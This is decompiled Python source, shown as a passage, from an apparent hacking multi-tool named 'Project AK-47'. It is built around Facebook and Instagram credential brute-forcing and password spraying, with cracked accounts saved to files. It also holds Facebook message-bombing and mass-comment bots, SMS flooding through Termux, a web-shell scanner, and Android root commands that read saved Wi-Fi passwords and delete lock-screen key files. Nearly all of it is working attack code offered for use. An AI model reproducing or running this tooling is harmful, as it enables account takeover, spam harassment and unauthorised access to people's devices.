                passxd = raw_input(SBG + ' Password to try on Online Users \n' + SGO + ' Password : ')
                online = []
                html = BeautifulSoup(s.get(url.format('/buddylist.php')).content, 'html.parser')
                for i in html.find_all('a'):
                    try:
                        if '/messages/read/?fbid' in i['href']:
                            online.append(str(i['href']).split('=')[1].split('&')[0])
                    except:
                        pass

                slist = []
                for i in range(len(online)):
                    try:
                        time.sleep(0.1)
                        sys.stdout.write('\r' + SBR + (' Getting ID :  {}{}').format(G, online[i]))
                        sys.stdout.flush()
                        slist.append(str(online[i]) + '|' + str(passxd))
                    except:
                        pass

                os.system('clear')
                print SBG + Y + " [BruteForce Result's Would Appear Here]"
                print SBG + (' ONLINE : {}{}').format(G, len(online))
                procx.map(checkl, slist)
                print xin + SBG + G + ' Saved to hacked.txt :)'
                print xin + SR + ' Type back to go back'

    elif optc == '3' or optc == '03':
        os.system('clear')
        print ("\n       {}[ Instagram Bruteforcer's ]\n\n     {} 1 : Single Password on Username's List\n     {} 2 : 3 Passwords on Username's List\n     {} 3 : Random Passwords on Username's List\n     {} 4 : WordList Attack \n     {} 5 : Go Back <=\n\n     ").format(G, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '5' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                try:
                    idfile = open(raw_input(SGO + " Username's File : "), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                passw = raw_input(SGO + ' Password To Try On Accounts : ')
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(passw))

                if len(passw) > 0 and len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(icheck, slist)
                    print xin + SBG + G + ' Saved to instahack.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '2' or rchoc == '02':
                try:
                    idfile = open(raw_input(SGO + " Username's File : "), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                passx1 = raw_input(SGO + ' Password  1 : ')
                passx2 = raw_input(SGO + ' Password  2 : ')
                passx3 = raw_input(SGO + ' Password  3 : ')
                print SBR + G + ' These 3 Passwords Would Be Checked on Each Account From List'
                time.sleep(2)
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(passx1) + '|' + str(passx2) + '|' + str(passx3))

                if len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(micheck, slist)
                    print xin + SBG + G + ' Saved to instahack.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '3' or rchoc == '03':
                try:
                    idfile = open(raw_input(SGO + ' Username File : '), 'r').read().split()
                    print SGO + (' Total Accounts : {}').format(len(idfile))
                except:
                    print SBR + R + ' Invalid File !'

                print SBR + G + ' Some Common Random Password Would Be Checked On Each'
                time.sleep(2)
                commonpass = ['pakistan', '123456', 'facebook', '786786', 'qwertyuiop', '0987654321']
                slist = []
                for i in range(len(idfile)):
                    slist.append(str(idfile[i]) + '|' + str(random.choice(commonpass)))

                if len(slist) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    procx.map(icheck, slist)
                    print xin + SBG + G + ' Saved to instahack.txt :)'
                    print xin + SR + ' Type back to go back'
            if rchoc == '4' or rchoc == '04':
                try:
                    passfile = open(raw_input(SGO + ' WordList File : '), 'r').read().split()
                    print SGO + (' Total Passwords : {}').format(len(passfile))
                    with open('.a', 'w') as (ax):
                        ax.write(str(len(passfile)))
                except:
                    print SBR + R + ' Invalid File !'

                acc = raw_input(SGO + ' USERNAME : ')
                slist = []
                for i in range(len(passfile)):
                    slist.append(str(acc) + '|' + str(passfile[i]))

                if len(passfile) > 0:
                    os.system('clear')
                    print SBG + Y + " [BruteForce Result's Would Appear Here]"
                    with open('.b', 'w') as (bx):
                        bx.write('')
                    procx.map(icheck, slist)
                    print xin + SBG + G + ' Saved to instahack.txt :)'
                    print xin + SR + ' Type back to go back'

    elif optc == '4' or optc == '04':
        os.system('clear')
        print ("\n       {}[ Facebook Tool's ]\n\n     {} 1 : FriendsList Dump\n     {} 2 : Account Information\n     {} 3 : Group Members ID Dump\n     {} 4 : Account App Status Check\n     {} 5 : Mass Comment Post\n     {} 6 : Accestoken Generate\n     {} 7 : Message to ID's From File\n     {} 8 : Message to All Online Friends\n     {} 9 : Live Account's Checker\n     {} 10 : Message-BOMB (Spam)\n     {} 11 : Checkpoint Detector\n     {} 12 : Go Back <=\n\n     ").format(G, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '12' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                limit = raw_input(SGO + ' How Many Pages : ')
                xurl = []
                ihtml = BeautifulSoup(s.get(url.format('/profile.php')).content, 'html.parser')
                for i in ihtml.find_all('a'):
                    if 'friends?lst=' in i['href']:
                        xurl.append(i['href'])

                html = BeautifulSoup(s.get(url.format(xurl[0])).content, 'html.parser')
                id = []
                q = 0
                while q <= int(limit):
                    q = q + 1
                    for i in html.find_all('a'):
                        try:
                            if '?fref=fr_tab' in i['href']:
                                sys.stdout.write('\r' + SBR + (" Getting USER's : {} {}  ").format(G, i['href'].split('/')[1].split('?')[0]))
                                sys.stdout.flush()
                                id.append(str(i['href'].split('/')[1].split('?')[0]))
                            if 'unit_cursor=' in i['href']:
                                html = BeautifulSoup(s.get(url.format(i['href'])).content, 'html.parser')
                        except:
                            pass

                print xin + SBG + (' Feteched USERS : {}{} ').format(G, len(id))
                with open('friendlist.txt', 'a') as (fl):
                    fl.write(('\n').join(id))
                print xin + SBG + G + " Saved USER's to friendlist.txt :)"
            if rchoc == '2' or rchoc == '02':
                acct = raw_input(SGO + ' Account ID : ')
                os.system('clear')
                try:
                    xhtml = BeautifulSoup(s.get(url.format('/profile.php?id=' + acct)).content, 'html.parser')
                    print xin + SBG + ('NAME :{} {}').format(G, xhtml.title.get_text())
                    print xin + Y + ' [ Other Information ]'
                    n = xhtml.find_all('td')
                    for i in range(len(n)):
                        try:
                            if n[i]['valign'] == 'top':
                                print SBG + (' {}{}').format(G, n[i].get_text())
                        except:
                            pass

                    print xin + SR + ' Type back to go back'
                except:
                    pass

            if rchoc == '3' or rchoc == '03':
                gi = raw_input(SGO + ' Group ID : ')
                funx(SBR + " Loading Group ID's Dumper")
                os.system('clear')
                idd = [].append(gi + '|' + '0')
                print xin + G + '       [ GROUP ID DUMP STATUS ]' + xin
                procx.map(gdump, idd)
                print SBR + ('Saved to {} groupid.txt').format(G)
                print xin + SR + ' Type back to go back'
            if rchoc == '4' or rchoc == '04':
                print ('\n         {}  [ Select Option ]\n  \n           {} 1 : Active Apps \n           {} 2 : Expired Apps\n      ').format(G, SBG, SBG)
                rch = raw_input(SGO + ' CHOICE : ')
                if rch == '1' or rch == '01':
                    oi = 0
                    os.system('clear')
                    print G + '      [ Active Apps ]     '
                    html = BeautifulSoup(s.get(url.format('/settings/apps/tabbed/')).content, 'html.parser')
                    for i in html.find_all('a'):
                        try:
                            if str(i)[11] == 'd':
                                if '/settings/applications/details/?app_id' in i['href']:
                                    oi += 1
                                    print G + ('({}){}[{}]').format(oi, W, i.get_text())
                        except:
                            pass

                if rch == '2' or rch == '02':
                    oi = 0
                    os.system('clear')
                    print G + '      [ Expired Apps ]     '
                    html = BeautifulSoup(s.get(url.format('/settings/apps/tabbed/?tab=inactive')).content, 'html.parser')
                    for i in html.find_all('a'):
                        try:
                            if str(i)[11] == 'd':
                                if '/settings/applications/details/?app_id' in i['href']:
                                    oi += 1
                                    print G + ('({}){}[{}]').format(oi, W, i.get_text())
                        except:
                            pass

                print xin + SR + ' Type back to go back'
            if rchoc == '5' or rchoc == '05':
                print SGO + ' Enter Post Link You Want to Comment On'
                poslink = raw_input(SGO + ' POST Link : ')
                nuicom = raw_input(SGO + ' Comment : ')
                nui = raw_input(SGO + ' How Many : ')
                with open('.com', 'w') as (umes):
                    umes.write(nuicom)
                alink = []
                alink.append(poslink)
                taskc = alink * int(nui)
                os.system('clear')
                print G + ' [ STATUS ]\n'
                procx.map(comment, taskc)
                print xin + SR + ' Type back to go back'
            if rchoc == '6' or rchoc == '06':
                print SRO + ' Enter Email/Password To Generate AcessToken'
                email = raw_input(SGO + ' Email : ')
                passwd = raw_input(SGO + ' Password : ')
                try:
                    actok = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + passwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6').content
                    if 'access_token' in actok:
                        tokn = json.loads(actok)['access_token']
                        print SBG + (' AcessToken : {}{}').format(G, tokn)
                        tfollow(('{}').format(tokn))
                    else:
                        print SBR + ' Incorrect Email/Password'
                except:
                    print SBR + ' Incorrect Email/Password'

                print xin + SR + ' Type back to go back'
            if rchoc == '7' or rchoc == '07':
                acct = open(raw_input(SGO + " ID's File  : "), 'r').read().split()
                try:
                    print SBG + (" Total ID's : {}{}").format(G, len(acct))
                except:
                    print SBR + ' Invalid File'

                mes = raw_input(SGO + ' Messaage To Send  : ')
                with open('.mes', 'w') as (umes):
                    umes.write(mes)
                os.system('clear')
                print G + '       [ STATUS ]\n'
                procx.map(sendmes, acct)
                print xin + SR + ' Type back to go back'
            if rchoc == '8' or rchoc == '08':
                mes = raw_input(SGO + ' Messaage To Send  : ')
                with open('.mes', 'w') as (umes):
                    umes.write(mes)
                online = []
                html = BeautifulSoup(s.get(url.format('/buddylist.php')).content, 'html.parser')
                for i in html.find_all('a'):
                    try:
                        if '/messages/read/?fbid' in i['href']:
                            online.append(str(i['href']).split('=')[1].split('&')[0])
                    except:
                        pass

                for i in range(len(online)):
                    try:
                        time.sleep(0.1)
                        sys.stdout.write('\r' + SBR + (' Getting ID :  {}{}').format(G, online[i]))
                        sys.stdout.flush()
                    except:
                        pass

                os.system('clear')
                print G + '       [ STATUS ]'
                print SBG + (' Online : {}{}').format(G, len(online))
                procx.map(sendmes, online)
                print xin + SR + ' Type back to go back'
            if rchoc == '9' or rchoc == '09':
                print SBG + ' Write Each Account in File with This Format'
                print SBR + ' email | password'
                acctf = open(raw_input(SGO + ' Accounts File : '), 'r').read().split()
                print SBG + (' Total Accounts : {}{}').format(G, len(acctf))
                funx(SBR + ' Analyzing Accounts ')
                os.system('clear')
                print G + '       [ LIVE ACCOUNT-STATUS ]\n'
                procx.map(livept, acctf)
                print SBG + ' Saved in live.txt'
                print xin + SR + ' Type back to go back'
            if rchoc == '10':
                acct = raw_input(SGO + ' Target ID : ')
                mes = raw_input(SGO + ' Messaage To Send  : ')
                amnt = raw_input(SGO + ' How Many ?  : ')
                acti = []
                acti.append(acct)
                totalm = acti * int(amnt)
                funx(SBR + (' Targeting Message Bomb On User : {}').format(acct))
                with open('.mes', 'w') as (umes):
                    umes.write(mes)
                os.system('clear')
                print G + '       [ STATUS ]\n'
                procx.map(sendmes, totalm)
                print xin + SR + ' Type back to go back'
            if rchoc == '11':
                print SBG + ' Write Each Account in File with This Format'
                print SBR + ' email | password'
                acctf = open(raw_input(SGO + ' Accounts File : '), 'r').read().split()
                print SBG + (' Total Accounts : {}{}').format(G, len(acctf))
                funx(SBR + ' Analyzing Accounts ')
                os.system('clear')
                print G + '       [ CHECKPOINT-STATUS ]\n'
                procx.map(checkpt, acctf)
                print SBG + ' Saved in checkpoint.txt'
                print xin + SR + ' Type back to go back'

    elif optc == '5' or optc == '05':
        os.system('clear')
        print ('\n       {}[ TERMUX TOOLS ]\n\n     {}Make Sure You Installed Termux-Api :)\n        {}${} apt-get install termux-api\n\n     {} 1 : Mass SMS Send\n     {} 2 : Network Status\n     {} 3 : INBOX - Messages\n     {} 4 : Battery Status\n     {} 5 : Scripts Installer\n     {} 6 : Go Back <=\n\n     ').format(G, Y, W, G, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '6' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                num = raw_input(SGO + ' Number : ')
                mesg = raw_input(SGO + ' Message(SMS) : ')
                amnt = raw_input(SGO + ' How Many ? : ')
                funx(SBR + ' Preparing System ')
                os.system('clear')
                print G + '       [ SMS-SENDING-STATUS ]\n'
                for i in range(1, int(amnt)):
                    try:
                        os.system(("termux-sms-send -n {} '{}' ").format(num, mesg))
                        print SBG + (' ({}) SMS Sent :)').format(i)
                    except:
                        print SBR + (' ({}) SMS Failed :)').format(i)

                print xin + SR + ' Type back to go back'
            if rchoc == '2' or rchoc == '02':
                funx(SBR + ' Getting Network Status ')
                os.system('clear')
                print G + '       [ NETWORK STATUS ]\n'
                try:
                    netw = os.popen('termux-telephony-deviceinfo').read()
                    print G + str(netw)
                except:
                    pass

                print xin + SR + ' Type back to go back'
            if rchoc == '3' or rchoc == '03':
                funx(SBR + ' Getting INBOX-Messages')
                os.system('clear')
                print G + '       [ INBOX-MESSAGES ]\n'
                try:
                    netw = json.loads(os.popen('termux-sms-list').read())
                    print SBR + (' Total Messages : {}{} \n ').format(G, len(netw))
                    for i in range(len(netw)):
                        print SBG + (' ({}) {} [{}]').format(i, G, netw[i]['body'])

                except:
                    pass

                print xin + SR + ' Type back to go back'
            if rchoc == '4' or rchoc == '04':
                funx(SBR + ' Getting Battery Details')
                os.system('clear')
                print G + '       [ BATTERY-INFORMATION ]\n'
                try:
                    netw = json.loads(os.popen('termux-battery-status').read())
                    print ('\n               \n              {} PERCENTAGE : {}{}%\n              {} HEALTH : {}{}\n              {} TEMPRATURE : {}{} C\n              {}  STATUS : {}({}/{})\n\n              ').format(SBG, G, netw['percentage'], SBG, G, netw['health'], SBG, G, netw['temperature'], SBG, G, netw['status'], netw['plugged'])
                except:
                    pass

                print xin + SR + ' Type back to go back'
            if rchoc == '5' or rchoc == '05':
                funx(SBR + ' Loading Scripts Installer')
                os.system('clear')
                print G + '       [ SCRIPTS-INSTALLER ]\n'
                print ('\n\n           {} 1) Install FLB\n           {} 2) Install NFD\n           {} 3) Install ASU\n           {} 4) Install NMAP\n           {} 5) Install RED-Hawk\n           {} 6) Install D-Tect\n           {} 7) Install SQL-Map\n           {} 8) Install ReconDog\n           {} 9) Install FIM\n           {} 10) Install MetaSploit\n           {} 0) Go Back\n           \n      ').format(SBR, SBR, SBR, SBR, SBR, SBR, SBR, SBR, SBR, SBR, SBG)
                while True:
                    rx = raw_input(SGO + 'CHOICE : ')
                    if rx == '1':
                        flb()
                    if rx == '2':
                        NFD()
                    if rx == '3':
                        asu()
                    if rx == '4':
                        nmap()
                    if rx == '5':
                        red_hawk()
                    if rx == '6':
                        dtect()
                    if rx == '7':
                        sqlmap()
                    if rx == '8':
                        reconDog()
                    if rx == '9':
                        fim()
                    if rx == '10':
                        metasploit()
                    if rx == '0':
                        break
                    else:
                        print SBR + ' Invalid Option !'

                print xin + SR + ' Type back to go back'

    elif optc == '6' or optc == '06':
        os.system('clear')
        print ('\n       {}[ WEB-HACKING TOOLS ]\n\n\n     {} 1 : WEB SHELL Finder\n     {} 2 : IP Locator\n     {} 3 : Website Header\n     {} 4 : Extracts Links From Website\n     {} 5 : Download Images From Site\n     {} 6 : Go Back <=\n\n     ').format(G, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '6' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                print SBR + (' Format : {} https://sitename.com').format(G)
                webs = raw_input(SGO + ' Website Link : ')
                sclist = shellp.split()
                print SBR + (" TOTAL SHELL's Database : {}{}").format(G, len(sclist))
                funx(SBR + ' Loading Shell Scanner')
                os.system('clear')
                print G + '      [ SHELL SCANNER RESULT ]' + '\n'
                lnks = []
                for i in range(len(sclist)):
                    lnks.append(webs + sclist[i])

                procx.map(shellscanner, lnks)
                print xin + SR + ' Type back to go back'
            if rchoc == '2' or rchoc == '02':
                ip = raw_input(SGO + ' IP-Adress : ')
                funx(SBR + (' Searching for IP : {}').format(ip))
                try:
                    os.system('clear')
                    r = get(('http://extreme-ip-lookup.com/json/{}').format(ip)).content
                    print G + '    [ IP-Location Status ]\n'
                    print r
                except:
                    print SBR + ' Network Error'

                print xin + SR + ' Type back to go back'
            if rchoc == '4' or rchoc == '04':
                print SBR + (' Format : {} https://sitename.com').format(G)
                webs = raw_input(SGO + ' Website Link : ')
                wurl = str(webs) + '{}'
                funx(SBR + (' Scanning for links in {}{}').format(G, webs))
                os.system('clear')
                print '     [ Links Scanner Status ]'
                try:
                    r = get(webs).content
                    html = BeautifulSoup(r, 'html.parser')
                    try:
                        for i in html.find_all('a'):
                            try:
                                print SBG + Y + ' ' + wurl.format(i['href'])
                            except:
                                pass

                        for i in html.find('a'):
                            try:
                                print SBG + Y + ' ' + i['src']
                            except:
                                pass

                    except:
                        pass

                except:
                    print SBR + ' Network Error or Invalid URL'

                print xin + SR + ' Type back to go back'
            if rchoc == '5' or rchoc == '05':
                print SBR + (' Format : {} https://sitename.com').format(G)
                webs = raw_input(SGO + ' Website Link : ')
                wurl = str(webs) + '{}'
                imglink = []
                funx(SBR + (' Scanning for Images in {}{}').format(G, webs))
                os.system('clear')
                print G + '     [ Images Scanner Status ]'
                try:
                    r = get(webs).content
                    html = BeautifulSoup(r, 'html.parser')
                    try:
                        for i in html.find_all('img'):
                            try:
                                print SBG + Y + ' ' + str(i['src'])
                                if 'http' not in str(i['src']):
                                    imglink.append(wurl.format(str(i['src'])))
                                else:
                                    imglink.append(str(i['src']))
                            except:
                                pass

                    except:
                        pass

                    print SBG + (' TOTAl IMAGES FOUND : {}{}').format(G, len(imglink))
                    funx(SBR + G + ' Downloading Images')
                    if not os.path.exists('web'):
                        os.mkdir('web')
                    for i in range(len(imglink)):
                        try:
                            sys.stdout.write(('\r{} Downloading.. ({}/{}) IMAGES').format(SBG, i + 1, len(imglink)))
                            sys.stdout.flush()
                            try:
                                r = get(imglink[i]).content
                                with open('web/' + str(imglink[i].split('/')[(-1)]), 'w') as (iwr):
                                    iwr.write(r)
                            except:
                                pass

                        except:
                            pass

                    print xin + SBG + ' Downloaded to web folder :) '
                except:
                    print SBR + ' Network Error or Invalid URL'

                print xin + SR + ' Type back to go back'

    elif optc == '7' or optc == '07':
        os.system('clear')
        print ("\n       {}[ BOT's Menu ]\n\n     {} 1 : Facebook Messages Show\n     {} 2 : Facebook Messages Custom Reply\n     {} 3 : Try Password on Each Message Sender\n     {} 4 : Go Back <=\n\n     ").format(G, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '4' or rchoc == 'back':
                main(url, '1')
            if rchoc == '100' or rchoc == '02':
                print SBR + ' Put Accounts in File like email|password'
                try:
                    em = open(raw_input(SGO + ' Accounts File : '), 'r').read().split()
                except:
                    print SBR + ' Invalid File'

                lnk = raw_input(SGO + ' Post Link : ')
                mex = raw_input(SGO + ' Comment : ')
                print SBG + (' Total Accounts : {}{}').format(G, len(em))
                pathx = []
                for i in range(len(em)):
                    pathx.append(('{}@{}').format(lnk, em[i]))

                with open('.com', 'w') as (umes):
                    umes.write(mex)
                funx(SBR + ' Loading BoT')
                os.system('clear')
                print G + '      [ Comments Status ]'
                procx.map(ecomment, idps)
            if rchoc == '1' or rchoc == '01':
                oldmes = []
                funx(SBR + ' Loading BOT Configuration ')
                os.system('clear')
                print G + '     [ Incomming Messages ]' + xin
                while True:
                    try:
                        o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
                        if o[1].get_text() not in oldmes:
                            print ('{} > {} [ {} ]').format(SBG, G, o[1].get_text())
                            oldmes.append(o[1].get_text())
                    except:
                        pass

            if rchoc == '2' or rchoc == '02':
                oldmes = []
                message = raw_input(SGO + ' Custom Reply Message : ')
                funx(SBR + ' Loading Custom Reply BOT ')
                os.system('clear')
                print G + '     [ Incomming Messages ]' + xin
                while True:
                    try:
                        o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
                        if o[1].get_text() not in oldmes:
                            print ('{} > {} [ {} ]').format(SBG, G, o[1].get_text())
                            n = o[0].a['href'].split('A')[1].split('&')[0]
                            oldmes.append(o[1].get_text())
                            fsend(n, message)
                    except:
                        pass

            if rchoc == '3' or rchoc == '03':
                oldmes = []
                pxa = raw_input(SGO + ' Password To Try On Messager Account : ')
                funx(SBR + ' Loading Custom Reply BOT ')
                os.system('clear')
                print G + '     [ Password Try On Message Sender ]' + xin
                while True:
                    try:
                        o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
                        if o[1].get_text() not in oldmes:
                            n = o[0].a['href'].split('A')[1].split('&')[0]
                            print ('{} > Trying on {}{}  {}[{}]').format(SBG, R, n, G, o[0].a.get_text())
                            oldmes.append(o[1].get_text())
                            checkms(n, pxa)
                    except:
                        pass

    elif optc == '8' or optc == '08':
        os.system('clear')
        print ('\n       {}[ ANDROID TOOLS ]\n\n     {}Make Sure Your Device is Rooted :)\n        {}${} Root@Android = :)\n\n     {} 1 : View Saved Wifi Password\n     {} 2 : Remove Pattern Lock\n     {} 3 : Remove Pin Lock\n     {} 4 : APK Install \n     {} 5 : Backup Apps\n     {} 6 : Go Back <=\n\n     ').format(G, Y, W, G, SBG, SBG, SBG, SBG, SBG, SBG)
        while 1:
            rchoc = raw_input(SGO + ' CHOICE : ')
            if rchoc == '6' or rchoc == 'back':
                main(url, '1')
            if rchoc == '1' or rchoc == '01':
                funx(SBR + ' Getting Wifi Passwords')
                os.system('clear')
                try:
                    print G + '   [ WIFI-Passwords ] '
                    wpass = os.popen("su -c 'cat /data/misc/wifi/wpa_supplicant.conf'").read()
                    print G + wpass
                except:
                    print SBR + ' Failed (Root Error)'

                print xin + SR + ' Type back to go back'
            if rchoc == '2' or rchoc == '02':
                funx(SBR + ' Removing Lockscreen Pattern')
                try:
                    os.system("su -c 'rm /data/system/gesture.key'")
                    print SBR + ' Pattern Removed Sucessfully'
                except:
                    print SBR + ' Failed (Root Error)'

            if rchoc == '3' or rchoc == '03':
                funx(SBR + ' Removing Lockscreen PIN')
                try:
                    os.system("su -c 'rm /data/system/password.key'")
                    print SBR + ' PIN Removed Sucessfully'
                except:
                    print SBR + ' Failed (Root Error)'

            if rchoc == '4' or rchoc == '04':
                apkp = raw_input(SGO + ' PATH TO APK : ')
                funx(SBR + ' Installing APK ')
                try:
                    os.system(("su -c 'pm install {}'").format(apkp))
                    print SBR + ' App Installed Sucessfully'
                except:
                    print SBR + ' Failed (Root Error)'

            if rchoc == '5' or rchoc == '05':
                apkp = raw_input(SGO + ' Where To Keep Backup (PATH)? : ')
                funx(SBR + ' Getting Apps ')
                try:
                    os.system(("su -c 'cp -r /data/app {}'").format(apkp))
                    print SBR + " App's Backup Sucessfull"
                except:
                    print SBR + ' Failed (Root Error)'

    elif optc == '9' or optc == '09':
        os.system('clear')
        funx(SBR + ' Updating Project AK-47 ')
        try:
            os.system('git pull')
            print SBG + ' Project AK-47 Updated Sucessfully..!'
        except:
            print SBR + ' Poject AK-47 Update Failed :('

    else:
        print SRO + R + ' Invalid Choice !'
        time.sleep(1)
        main(url, '1')


if not os.path.exists('.cookie'):
    print SG + ' Login With Facebook Email/Password..'
    login(url)
else:
    funx(SG + ' Loading Available Cookies Data')
    try:
        s.cookies.update(json.loads(open('.cookie', 'r').read()))
        print xin + SG + " Cookie's Data Loaded !"
        main(url, '0')
    except:
        pass
# okay decompiling done.pyc
